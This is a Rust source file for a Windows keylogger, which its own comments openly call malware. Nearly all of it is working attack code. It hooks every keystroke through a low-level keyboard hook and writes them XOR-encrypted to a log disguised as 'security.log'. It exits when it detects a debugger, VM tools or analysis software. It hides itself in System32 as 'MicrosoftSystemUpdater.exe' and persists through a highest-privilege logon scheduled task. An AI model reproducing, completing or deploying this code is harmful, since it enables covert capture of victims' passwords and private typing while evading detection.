use std::fs::{self, OpenOptions};
use std::os::windows::process::CommandExt;
use std::sync::Mutex;
use once_cell::sync::Lazy;
use std::io::Write;
use crate::encode::{EncodeFile};
use std::path::{PathBuf};
use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;

use windows::Win32::Foundation::{
    HWND, LPARAM, LRESULT, WPARAM
};
use windows::Win32::System::SystemInformation::{
    GetSystemInfo,
    SYSTEM_INFO,
    PROCESSOR_ARCHITECTURE,
    PROCESSOR_ARCHITECTURE_ALPHA,
    PROCESSOR_ARCHITECTURE_ALPHA64,
    PROCESSOR_ARCHITECTURE_AMD64,
    PROCESSOR_ARCHITECTURE_ARM,
    PROCESSOR_ARCHITECTURE_ARM64,
    PROCESSOR_ARCHITECTURE_ARM32_ON_WIN64,
    PROCESSOR_ARCHITECTURE_IA64,
    PROCESSOR_ARCHITECTURE_IA32_ON_ARM64,
    PROCESSOR_ARCHITECTURE_IA32_ON_WIN64,
    PROCESSOR_ARCHITECTURE_INTEL,
    PROCESSOR_ARCHITECTURE_MIPS,
    PROCESSOR_ARCHITECTURE_MSIL,
    PROCESSOR_ARCHITECTURE_NEUTRAL,
    PROCESSOR_ARCHITECTURE_PPC,
    PROCESSOR_ARCHITECTURE_SHX,
    PROCESSOR_ARCHITECTURE_UNKNOWN,
};

use windows::Win32::UI::WindowsAndMessaging::{
    CallNextHookEx,
    DispatchMessageW,
    GetMessageW,
    SetWindowsHookExA,
    TranslateMessage,
    UnhookWindowsHookEx,
    KBDLLHOOKSTRUCT,
    MSG,
    WH_KEYBOARD_LL,
    WM_KEYDOWN

};


use windows::Win32::UI::Input::KeyboardAndMouse::{

    GetKeyState, GetKeyboardState, MapVirtualKeyW, ToUnicode, MAPVK_VK_TO_VSC, VK_CAPITAL, VK_SHIFT
};

use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, PROCESSENTRY32, Process32First, Process32Next, TH32CS_SNAPPROCESS

};

// creates a global xor shift to left encoder
//randomizes key
static ENCODER: Lazy<Mutex<EncodeFile>> = Lazy::new(|| Mutex::new(EncodeFile::new( 42)));

static KEYLOGGING_FILE: Lazy<PathBuf> = Lazy::new(|| {
    let appdata = std::env::var("APPDATA").expect("APPDATA not found");
    let mut path = PathBuf::from(appdata);
    path.push("Microsoft\\Windows\\security.log");
    path
});

//function that finds the windows version of the host
//this is used to exfiltrate to the c2 server, notifying
//what type of cost this is
pub fn get_windows_version() -> &'static str{

    //obtain the info it is
    let mut system_info = SYSTEM_INFO::default();
    unsafe {
        GetSystemInfo(&mut system_info);
    };

    //from the info, find the the architecture
    let arch = unsafe {
        system_info.Anonymous.Anonymous.wProcessorArchitecture
    };

    //obtains what type of malware it is
    get_system_arch(arch)
}

//helper function, to convert process_arch enum to string
//this makes it easier for the malware to exfiltrate the info
fn get_system_arch(arch: PROCESSOR_ARCHITECTURE) ->  &'static str {

    match arch {
        PROCESSOR_ARCHITECTURE_ALPHA => "Alpha",
        PROCESSOR_ARCHITECTURE_ALPHA64 => "Alpha64",
        PROCESSOR_ARCHITECTURE_AMD64 => "x64 (AMD or Intel 64-bit)",
        PROCESSOR_ARCHITECTURE_ARM => "ARM",
        PROCESSOR_ARCHITECTURE_ARM64 => "ARM64",
        PROCESSOR_ARCHITECTURE_ARM32_ON_WIN64 => "ARM32 on Win64",
        PROCESSOR_ARCHITECTURE_IA64 => "Intel Itanium (IA-64)",
        PROCESSOR_ARCHITECTURE_IA32_ON_ARM64 => "x86 emulation on ARM64",
        PROCESSOR_ARCHITECTURE_IA32_ON_WIN64 => "x86 emulation on Win64",
        PROCESSOR_ARCHITECTURE_INTEL => "x86 (32-bit)",
        PROCESSOR_ARCHITECTURE_MIPS => "MIPS",
        PROCESSOR_ARCHITECTURE_MSIL => "MSIL",
        PROCESSOR_ARCHITECTURE_NEUTRAL => "Neutral",
        PROCESSOR_ARCHITECTURE_PPC => "PowerPC",
        PROCESSOR_ARCHITECTURE_SHX => "SHX",
        PROCESSOR_ARCHITECTURE_UNKNOWN => "Unknown",
        _ => "Other / Reserved",
    }
}

//function that sets window hooks
//this is to set the function to trigger on each key stroke
//powering the keylogger
pub unsafe fn set_windows_hook(){

    unsafe{
        //the hook that will be used
        let hook = SetWindowsHookExA(WH_KEYBOARD_LL, Some(keyboard_callback), None, 0).unwrap();

        println!("[Debugging] Hook is now listenting");

        let mut msg = MSG::default();

        // This keeps the thread alive to receive hook messages
        while GetMessageW(&mut msg, Some(HWND(std::ptr::null_mut())), 0, 0).as_bool() {
             let _ = TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }

        //used to unhook the callbck from each keystroke
        let _ = UnhookWindowsHookEx(hook);
    }
}

//This is the call back function used by SetWindowHookExA to hook on presses
//this the main function for keylogging activites, allowing key strokes to be
//detected and writtin into the file
extern "system" fn keyboard_callback(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT{

    unsafe {

        //if keypressed action was down
        if code >= 0 && wparam.0 as u32 == WM_KEYDOWN  {

        let kb_struct = &*(lparam.0 as *const KBDLLHOOKSTRUCT);
        
        //vkcode of the button
        let vk_code = kb_struct.vkCode;

        println!("[Debugging] Key event: vkCode = {}, wParam = {}", vk_code, wparam.0);
        
        //first checks if VK code is speical button and then convert
        //if not make it into a normal char
        let key_pressed = match vk_code {
            8 => {"[BACKSPACE]"}
            9 => {"[TAB]"}
            13 => {"[ENTER]"}
            20 => {"[CAP]"}
            27 => {"[ESC]"}
            92 => {"[WIN]"}
            160 => {"[L-SHIFT]"}
            161 => {"[R-SHIFT]"}
            162 => {"[L-CTRL]"}
            163  => {"[R-CTRL]"}
            _ => &vk_code_to_char(vk_code).unwrap().to_string()
            
        };

        //write into the file, where it will also be encrypted
        write_into_file(&key_pressed);

    }

    CallNextHookEx(None, code, wparam, lparam)

    }


}

//function to turn the codes detected from the key strokes
//into readable strings
unsafe fn vk_code_to_char(vk_code:u32) -> Option<char>{

    unsafe{

        
        let mut keyboard_state = [0u8;256];

         let _ = GetKeyboardState(&mut keyboard_state);

        // Simulate Caps Lock toggle
        let caps = GetKeyState(VK_CAPITAL.0 as i32) & 0x0001;
        if caps != 0 {
            keyboard_state[VK_CAPITAL.0 as usize] |= 0x01;
        }

        // Simulate Shift pressed
        let shift = GetKeyState(VK_SHIFT.0 as i32);
        if (shift as u16) & 0x8000 != 0 {
            keyboard_state[VK_SHIFT.0 as usize] |= 0x80;
        }

        let mut char_buf = [0u16; 2];

        let scan_code = MapVirtualKeyW(vk_code, MAPVK_VK_TO_VSC);

        let _ = ToUnicode(vk_code, scan_code, Some(& keyboard_state),& mut char_buf, 0);
        
        
        char::from_u32(char_buf[0] as u32)

    }
}

//write into file and encrypt it
//This allows for messages to be encrypted making it harder
//for analysis to read it
fn write_into_file(button_pressed:& str){
    let mut enc = ENCODER.lock().unwrap();

    //open file for appending
    let mut data_file = OpenOptions::new()
    .create(true)
    .append(true).
    open(KEYLOGGING_FILE.as_path()).expect("Cannot open file");
    
    //encrypt the plaintext and write it
    let enc = enc.encrypt(button_pressed);
    writeln!(data_file, "{}", &enc).expect("msg");
     
}

//function that reads in to file
//this is only used for reading key logs, decoding them
pub fn read_file() -> String{

    let mut dec = ENCODER.lock().unwrap();

    //displays where the keylogging file is
    println!("{}",KEYLOGGING_FILE.display());
    
    //rest the key for decoding
    dec.reset_key();

    //opens the file, to apend it and crete it if needed
    OpenOptions::new()
        .create(true)
        .append(true) 
        .open(KEYLOGGING_FILE.as_path())
        .expect("Failed to create or open file");

    //read the file if it exist
    let read = fs::read_to_string(KEYLOGGING_FILE.as_path())
    .expect("can't read into file");

    //string to contain the string
    let mut decode_string = String::new();

    //decode the encrypted keylogging file line by line
    for line in read.lines(){
        let decoded_char = dec.decrypt(line);

        decode_string.push_str(&decoded_char);
    }
    
    //rest key
    dec.reset_key();

    decode_string
}


//function used to delete files
//used by the main OS
pub fn delete_file(){

    let _ = fs::remove_file(KEYLOGGING_FILE.as_path());
}

//Function to check if malware is running in a simulated enviroment
//This is to prevent it from being analysied 
pub fn check_for_analysis_behaviour(){

    //malware
    let warry_process:Vec<String> = vec!["vboxservice.exe", "vmtoolsd.exe","wireshark.exe", "procmon.exe", "ollydbg.exe","x64dbg.exe"].into_iter().map(String::from).collect();

    //if malware is a part of a debugger, exit
    if check_for_debugging(){
        std::process::exit(1);
    }

    //Checks whenever the current process show process
    let cur_process = snap_process();

    //if current process is less than 30, may points it to be a sandbox
    //OR there is an a prcess detected used for analysis
    //i.e virutal machines, anti debugging etc.
    if cur_process.len() < 30 || check_for_overlap(&cur_process, &warry_process) { 
        //if so exit
        std::process::exit(1);
    }
    
}

// Check if malware is running with a debugger, showing it's being analysed
pub fn check_for_debugging() ->  bool{
    unsafe{
        IsDebuggerPresent().as_bool()     
    }
}

//function that takes a snap shot of the running process
pub fn snap_process() -> Vec<String>{

    let mut process: Vec<String>  = Vec::new();

      unsafe {
        // Take a snapshot of all processes
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).unwrap();
        // Initialize PROCESSENTRY32 struct
        let mut pe32 = PROCESSENTRY32::default();
        pe32.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

        // loops through all process
        if Process32First(snapshot, &mut pe32).is_ok() {
            loop {
                
                //push found process in vector
                let process_name = ansi_to_string(&pe32.szExeFile).to_lowercase();
                process.push(process_name);

                //if no more process brek from the loop
                if !Process32Next(snapshot, &mut pe32).is_ok() {
                    break;
                }
            }
            
            
        }
         process
    }
}

//Function to move the malware into a more secure place, and run it as a sheduled task
//This is to hide itself from the infected user, making it less likely to find it
pub fn setup_malware(){

    //Find the current executable
    let curr_file = std::env::current_exe().expect("Can't find");

    //New name location and name of the executable
    let new_file = std::path::Path::new("C:\\Windows\\System32\\MicrosoftSystemUpdater.exe");

    //if the malware is not new file set it up
    if new_file != curr_file.as_path(){

        //var that tells process to run in the background
        const DETACHED_PROCESS: u32 = 0x00000008;

        //move the fike
        fs::copy(&curr_file, &new_file).expect("Failed to copy to new location");

        //name of new task
        let task_name = "MicrosoftSystemUpdater";


        //set the malware as a sheduled task, for persistency
        //i.e when system shuts off, the malware will keep on running
        let _ = std::process::Command::new("schtasks")
        .args(&[
            "/Create",
            "/SC", "ONLOGON",                    // triggers quietly on user login
            "/TN", task_name,
            "/TR", new_file.to_str().unwrap(),
            "/RL", "HIGHEST",                    // run with admin rights
            "/F",                                // force create
        ])
        .output()
        .expect("failed to run schtasks");

        //run new process and make it run in the background
        //This makes the malware stealthy for the user not to notice it running
        std::process::Command::new(new_file).creation_flags(DETACHED_PROCESS).spawn().unwrap();

        //exit the current proess
        std::process::exit(0);

    }
}



//HELPER FUNCTIONS 

//function that converts ANSI to string
fn ansi_to_string(bytes: &[i8]) -> String {
    let nul_pos = bytes.iter().position(|&b| b == 0).unwrap_or(bytes.len());
    let u8_slice = &bytes[..nul_pos];
    let u8_slice = u8_slice.iter().map(|&b| b as u8).collect::<Vec<u8>>();
    String::from_utf8_lossy(&u8_slice).to_string()
}

//function to check for overlap
fn check_for_overlap(v1: &[String], v2: &[String]) -> bool{
    let set_a: std::collections::HashSet<_> = v1.iter().collect();
    v2.iter().any(|item| set_a.contains(item))
}